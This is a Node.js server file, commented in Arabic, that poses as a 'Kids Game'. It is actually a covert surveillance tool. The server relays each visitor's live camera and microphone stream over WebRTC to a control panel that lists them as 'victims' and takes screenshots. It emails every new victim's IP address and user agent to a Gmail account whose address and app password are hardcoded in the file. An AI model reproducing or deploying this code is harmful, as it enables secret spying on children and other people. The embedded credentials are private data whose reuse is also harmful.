// server.js — قم بتشغيله بدلاً من PHP
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const nodemailer = require('nodemailer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const PORT = 8080;

// ⚙️ إعدادات الإيميل — عدلها حسب بريدك (Gmail مع App Password)
const EMAIL_CONFIG = {
  from: 'aalsawalmeh1986@gmail.com',
  to: 'aalsawalmeh1986@gmail.com',     // بريدك اللي تبغى تجي فيه الإشعارات
  subject: '🚨 NEW VICTIM CONNECTED - Kids Game',
  smtp: {
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
      user: 'aalsawalmeh1986@gmail.com',
      pass: 'yyol dool tktz ayea'   // استخدم App Password (ليس كلمة المرور العادية)
    }
  }
};

const transporter = nodemailer.createTransport(EMAIL_CONFIG.smtp);

// تخزين الجلسات النشطة
const activeSessions = new Map();
let sessionCounter = 0;

// ========== Serve Static Files ==========
app.use(express.static(path.join(__dirname, 'public')));

// صفحة الألعاب
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ========== Control Panel ==========
app.get('/control', (req, res) => {
  res.send(`
<html>
<head>
  <title>🎮 Control Panel - Kids Game</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0f0f1a;
      color: white;
      padding: 20px;
    }
    h1 { 
      text-align: center;
      margin-bottom: 30px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      font-size: 36px;
    }
    .stats {
      text-align: center;
      margin-bottom: 25px;
      font-size: 18px;
    }
    .stats span { 
      background: rgba(255,255,255,0.1);
      padding: 8px 20px;
      border-radius: 20px;
      margin: 0 5px;
    }
    .sessions {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
      gap: 20px;
      max-width: 1400px;
      margin: 0 auto;
    }
    .session-card {
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 16px;
      padding: 20px;
      backdrop-filter: blur(10px);
    }
    .session-card h3 {
      color: #667eea;
      margin-bottom: 10px;
    }
    .session-card .info {
      font-size: 13px;
      color: #aaa;
      margin-bottom: 15px;
    }
    .session-card video {
      width: 100%;
      border-radius: 10px;
      background: #000;
    }
    .session-card .controls {
      margin-top: 12px;
      display: flex;
      gap: 10px;
    }
    .session-card button {
      flex: 1;
      padding: 10px;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }
    .btn-audio { background: #6bcb77; color: #000; }
    .btn-stop { background: #ff6b6b; color: white; }
    .btn-snap { background: #4d96ff; color: white; }
    .session-card button:active { transform: scale(0.95); }
    .no-sessions {
      text-align: center;
      grid-column: 1 / -1;
      padding: 60px;
      color: #666;
      font-size: 20px;
    }
    .status-dot {
      display: inline-block;
      width: 10px;
      height: 10px;
      border-radius: 50%;
      margin-right: 8px;
    }
    .status-dot.online { background: #6bcb77; box-shadow: 0 0 10px #6bcb77; }
    .status-dot.offline { background: #ff6b6b; }
    .logs {
      max-width: 800px;
      margin: 30px auto;
      background: rgba(0,0,0,0.3);
      border-radius: 12px;
      padding: 20px;
      max-height: 200px;
      overflow-y: auto;
    }
    .logs h3 { margin-bottom: 10px; color: #666; }
    .logs .log-entry { font-size: 12px; color: #888; padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
    .refresh-btn {
      display: block;
      margin: 20px auto;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      border: none;
      padding: 12px 40px;
      border-radius: 50px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>🎮 Control Panel</h1>
  <div class="stats">
    <span>🟢 <span id="sessionCount">0</span> active sessions</span>
    <span>📸 <span id="totalSnaps">0</span> snapshots</span>
  </div>
  <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
  <div class="sessions" id="sessionList"></div>
  <div class="logs" id="logs">
    <h3>📋 Live Logs</h3>
  </div>
  
  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const sessionList = document.getElementById('sessionList');
    const sessionCount = document.getElementById('sessionCount');
    const logsDiv = document.getElementById('logs');

    function addLog(msg) {
      const entry = document.createElement('div');
      entry.className = 'log-entry';
      entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
      logsDiv.appendChild(entry);
      logsDiv.scrollTop = logsDiv.scrollHeight;
    }

    const peerConnections = {};
    const remoteStreams = {};

    socket.on('connect', function() {
      addLog('✅ Connected to signaling server');
    });

    socket.on('session-list', function(sessions) {
      sessionList.innerHTML = '';
      sessionCount.textContent = sessions.length;

      if (sessions.length === 0) {
        sessionList.innerHTML = '<div class="no-sessions">🔴 Waiting for victims to connect...</div>';
        return;
      }

      sessions.forEach(sid => {
        if (document.getElementById('card-' + sid)) return;

        const card = document.createElement('div');
        card.className = 'session-card';
        card.id = 'card-' + sid;

        const v = document.createElement('video');
        v.id = 'video-' + sid;
        v.autoplay = true;
        v.playsinline = true;
        v.style.width = '100%';
        v.style.borderRadius = '10px';
        v.muted = true;

        const info = document.createElement('div');
        info.className = 'info';
        info.innerHTML = '<span class="status-dot online"></span> Session: <strong>' + sid + '</strong>';

        const controlsDiv = document.createElement('div');
        controlsDiv.className = 'controls';
        
        const btnAudio = document.createElement('button');
        btnAudio.className = 'btn-audio';
        btnAudio.textContent = '🔊 Unmute Audio';
        btnAudio.onclick = function() {
          v.muted = !v.muted;
          btnAudio.textContent = v.muted ? '🔊 Unmute Audio' : '🔇 Mute Audio';
        };

        const btnSnap = document.createElement('button');
        btnSnap.className = 'btn-snap';
        btnSnap.textContent = '📸 Screenshot';
        btnSnap.onclick = function() {
          const canvas = document.createElement('canvas');
          canvas.width = v.videoWidth;
          canvas.height = v.videoHeight;
          canvas.getContext('2d').drawImage(v, 0, 0);
          const link = document.createElement('a');
          link.download = 'snapshot_' + sid + '_' + Date.now() + '.png';
          link.href = canvas.toDataURL();
          link.click();
        };

        controlsDiv.appendChild(btnAudio);
        controlsDiv.appendChild(btnSnap);

        card.appendChild(info);
        card.appendChild(v);
        card.appendChild(controlsDiv);
        sessionList.appendChild(card);

        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        peerConnections[sid] = pc;

        pc.ontrack = function(event) {
          if (event.streams && event.streams[0]) {
            v.srcObject = event.streams[0];
            remoteStreams[sid] = event.streams[0];
            addLog('📡 Stream received from ' + sid);
          }
        };

        pc.oniceconnectionstatechange = function() {
          if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
            addLog('🔴 Session ' + sid + ' disconnected');
            if (card.parentNode) card.remove();
            delete peerConnections[sid];
            delete remoteStreams[sid];
          }
        };

        pc.createOffer()
          .then(offer => pc.setLocalDescription(offer))
          .then(() => socket.emit('ctrl-offer', { target: sid, offer: pc.localDescription }))
          .catch(e => console.log(e));

        socket.on('ctrl-answer-' + sid, function(answer) {
          pc.setRemoteDescription(new RTCSessionDescription(answer));
          addLog('🔗 Connected to ' + sid);
        });

        socket.on('ctrl-ice-' + sid, function(candidate) {
          pc.addIceCandidate(new RTCIceCandidate(candidate));
        });
      });
    });

    socket.on('new-session', function(sid) {
      addLog('🆕 New victim connected: ' + sid);
      socket.emit('get-sessions');
    });

    socket.on('session-gone', function(sid) {
      addLog('🔴 Session ended: ' + sid);
      const card = document.getElementById('card-' + sid);
      if (card && card.parentNode) card.remove();
      delete peerConnections[sid];
      delete remoteStreams[sid];
    });

    setInterval(() => socket.emit('get-sessions'), 5000);
    socket.emit('get-sessions');
  </script>
</body>
</html>
  `);
});

// ========== Socket.IO Signaling ==========
io.on('connection', (socket) => {
  const clientIP = socket.handshake.address;
  const sessionId = 'SESS-' + (++sessionCounter).toString(16).toUpperCase() + '-' + Date.now().toString(36);
  
  console.log(`[+] New connection: ${sessionId} from ${clientIP}`);

  socket.on('get-sessions', () => {
    socket.isControl = true;
    const activeList = Array.from(activeSessions.keys());
    socket.emit('session-list', activeList);
  });

  socket.on('offer', (offer) => {
    socket.sessionId = sessionId;
    activeSessions.set(sessionId, { socket, ip: clientIP, connectedAt: Date.now() });
    
    const mailBody = `
🚨 NEW VICTIM CONNECTED 🚨

Session ID: ${sessionId}
IP Address: ${clientIP}
Time: ${new Date().toLocaleString()}
User-Agent: ${socket.handshake.headers['user-agent'] || 'N/A'}

Open Control Panel: http://localhost:${PORT}/control
    `;

    transporter.sendMail({
      from: EMAIL_CONFIG.from,
      to: EMAIL_CONFIG.to,
      subject: EMAIL_CONFIG.subject + ' - ' + sessionId,
      text: mailBody
    }).then(() => {
      console.log(`[EMAIL] Alert sent for ${sessionId}`);
    }).catch(err => {
      console.log(`[EMAIL] Failed to send: ${err.message}`);
    });

    io.emit('new-session', sessionId);
    socket.offer = offer;
    console.log(`[SIGNAL] Offer received from ${sessionId}`);
  });

  socket.on('ctrl-offer', (data) => {
    const victim = activeSessions.get(data.target);
    if (victim) {
      victim.socket.emit('ctrl-offer', data.offer);
      
      victim.socket.on('ctrl-answer', (answer) => {
        socket.emit('ctrl-answer-' + data.target, answer);
      });

      victim.socket.on('ctrl-ice', (candidate) => {
        socket.emit('ctrl-ice-' + data.target, candidate);
      });
      
      console.log(`[SIGNAL] Control relay established for ${data.target}`);
    }
  });

  socket.on('ice-candidate', (candidate) => {
    if (socket.sessionId) {
      socket.broadcast.emit('ice-candidate', candidate);
    }
  });

  socket.on('disconnect', () => {
    if (socket.sessionId) {
      activeSessions.delete(socket.sessionId);
      io.emit('session-gone', socket.sessionId);
      console.log(`[-] Session ended: ${socket.sessionId}`);
    }
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════╗
║    🎮 Kids Game Server Running           ║
╠══════════════════════════════════════════╣
║  Game Page:  http://localhost:${PORT}      ║
║  Control:    http://localhost:${PORT}/control ║
║  Port:       ${PORT}                       ║
║  Email Alerts: ${EMAIL_CONFIG.smtp.auth.user ? '✅ Active' : '❌ Not configured'}  ║
╚══════════════════════════════════════════╝
  `);
});
